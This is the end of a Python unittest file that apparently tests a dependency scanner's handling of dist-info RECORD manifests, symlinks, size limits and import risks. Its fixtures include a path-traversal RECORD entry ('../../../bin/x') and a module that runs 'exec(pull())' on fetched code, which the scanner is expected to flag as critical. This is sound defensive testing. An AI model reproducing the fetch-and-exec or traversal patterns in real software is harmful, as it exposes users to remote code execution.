    def test_a_record_joins_what_it_lists(self):
        self.write("x-1.0.dist-info/RECORD", "a.py,sha256=1,2\nb.py,,\npkg/__init__.py,,\nx-1.0.dist-info/RECORD,,\n"
                                             "../../../bin/x,,\n__pycache__/a.cpython-312.pyc,,\n")
        rels = ["a.py", "b.py", "pkg/__init__.py", "c.py"]
        self.assertEqual(self.groups(rels), {"a.py": "x-1.0.dist-info", "b.py": "x-1.0.dist-info",
                                             "pkg/__init__.py": "x-1.0.dist-info"})

    def test_two_records_that_share_a_name_join_all(self):
        self.write("a-1.dist-info/RECORD", "a.py,,\nb.py,,\n")
        self.write("b-1.dist-info/RECORD", "b.py,,\nc.py,,\n")
        self.assertEqual(set(self.groups(["a.py", "b.py", "c.py"]).values()), {"a-1.dist-info"})

    def test_what_is_no_group(self):
        # a namespace package two distributions share, each listing one name; a RECORD that is a link or too long
        import os
        self.write("g1-1.dist-info/RECORD", "ns/one/__init__.py,,\n")
        self.write("g2-1.dist-info/RECORD", "ns/two/__init__.py,,\n")
        self.assertEqual(self.groups(["ns/one/__init__.py", "ns/two/__init__.py", "top.py"]), {})
        self.write("elsewhere/RECORD", "top.py,,\nns/one/__init__.py,,\n")
        site = os.path.join(self.root, *self.site.split("/"))
        try:
            os.symlink(os.path.join(site, "elsewhere"), os.path.join(site, "link-1.dist-info"))
        except (OSError, NotImplementedError):
            self.skipTest("no symbolic links here")
        self.assertEqual(self.groups(["ns/one/__init__.py", "top.py"]), {})
        self.write("big-1.dist-info/RECORD", "top.py,,\nns/one/__init__.py,,\n")
        from unittest import mock
        with mock.patch.object(core, "_XF_RECORD_BYTES", 10):
            self.assertEqual(self.groups(["ns/one/__init__.py", "top.py"]), {})
        self.assertEqual(set(self.groups(["ns/one/__init__.py", "top.py"]).values()), {"big-1.dist-info"})

    def test_a_deps_scan_reads_a_distribution(self):
        self.write("a.py", PY_NET)
        self.write("b.py", "from a import pull\nexec(pull())\n")
        self.write("x-1.0.dist-info/RECORD", "a.py,,\nb.py,,\n")
        res = core.scan_project(self.root, include_deps=True)
        got = [(i["file"].replace("\\", "/"), i["sev"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
        self.assertEqual(got, [(self.site + "/b.py", "CRITICAL")])


if __name__ == "__main__":
    unittest.main()
